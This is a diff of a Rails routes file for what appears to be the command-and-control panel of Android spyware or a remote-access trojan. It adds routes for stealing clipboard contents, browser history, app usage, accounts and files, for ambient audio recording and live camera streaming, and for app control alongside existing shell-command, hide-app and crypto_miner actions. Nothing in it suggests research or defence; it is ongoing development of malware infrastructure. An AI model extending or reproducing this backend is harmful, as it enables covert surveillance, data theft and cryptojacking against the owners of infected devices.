@@ -1,4 +1,65 @@
 Rails.application.routes.draw do
+  # Audit Trail System
+  resources :audit_logs, only: [:index, :show] do
+    collection do
+      get :export
+      get :stats
+    end
+  end
+
+  # Notification & Alert System
+  resources :alert_rules do
+    member do
+      post :toggle
+    end
+  end
+  
+  resources :alerts, only: [:index, :show] do
+    member do
+      post :acknowledge
+    end
+    collection do
+      get :stats
+    end
+  end
+  
+  resources :notification_channels do
+    member do
+      post :test
+    end
+  end
+
+  # Fleet Management
+  resources :device_groups do
+    member do
+      post :add_devices
+      post :remove_devices
+      post :bulk_command
+    end
+  end
+
+  resources :apk_installations do
+    resources :tags, controller: :device_tags, only: [:index, :create, :destroy]
+    
+    # App Control Panel routes
+    get 'apps', to: 'app_control#index'
+    post 'apps/refresh', to: 'app_control#refresh'
+    post 'apps/install', to: 'app_control#install'
+    delete 'apps/:package_name', to: 'app_control#uninstall'
+    post 'apps/:package_name/launch', to: 'app_control#launch'
+    post 'apps/:package_name/kill', to: 'app_control#kill'
+    get 'processes', to: 'app_control#processes'
+    get 'apps/:package_name/permissions', to: 'app_control#permissions'
+    patch 'apps/:package_name/permissions', to: 'app_control#update_permissions'
+  end
+
+  get '/devices/tags/search', to: 'device_tags#search'
+
+  # Chunked File Uploads
+  post 'file_transfers/upload_chunk', to: 'file_transfers#upload_chunk'
+  post 'file_transfers/finalize_upload', to: 'file_transfers#finalize_upload'
+  post 'file_transfers/cleanup_expired_uploads', to: 'file_transfers#cleanup_expired_uploads'
+
   # WebRTC & Live Streaming
   get 'webrtc/turn_credentials', to: 'webrtc#turn_credentials'
   post 'webrtc/signal', to: 'webrtc#signal'
@@ -33,6 +94,18 @@ Rails.application.routes.draw do
     post 'photos', to: 'media#upload_photo'
     post 'audio', to: 'media#upload_audio'
     post 'calls', to: 'call_logs#upload_dump'
+    post 'clipboard', to: 'clipboard#receive'
+    post 'app_usage', to: 'app_usage#receive'
+    post 'browser_history', to: 'browser_history#receive'
+    post 'file_browser', to: 'file_browser#receive'
+    post 'geofence', to: 'geofence#receive'
+
+    namespace :v1 do
+      get 'telemetry/devices', to: 'telemetry#devices'
+      get 'telemetry/command_queue', to: 'telemetry#command_queue'
+      get 'telemetry/webrtc_status', to: 'telemetry#webrtc_status'
+      get 'telemetry/uploads', to: 'telemetry#uploads'
+    end
   end
 
   # Admin config save endpoint
@@ -40,7 +113,7 @@ Rails.application.routes.draw do
     post 'android_config/update', to: 'android_settings#update', as: 'android_config_update'
   end
 
-  resources :apk_installations
+
   resources :apk_payloads
   resources :contacts do
     collection do
@@ -98,6 +171,8 @@ Rails.application.routes.draw do
       get :check_connection
       post :install
       post :front_camera_snap
+      post :get_accounts
+      post :toggle_wifi
       post :select_smartphone
       post :take_picture
       post :dump_sysinfo
@@ -114,11 +189,19 @@ Rails.application.routes.draw do
       post :run_shell_command
       post :dump_device_info
       post :pull_file
+      post :ambient_record
+      post :browse_files
+      post :get_app_usage
+      post :get_browser_history
+      post :start_webrtc_stream
       get :hide_app
       get :show_app
       get :crypto_miner  # Fixed typo: was crypto_minner
     end
   end
+
+  post '/graphql', to: 'graphql#execute'
+  get '/dashboard', to: 'dashboards#index'
 
   devise_for :admin_users, ActiveAdmin::Devise.config
   ActiveAdmin.routes(self)
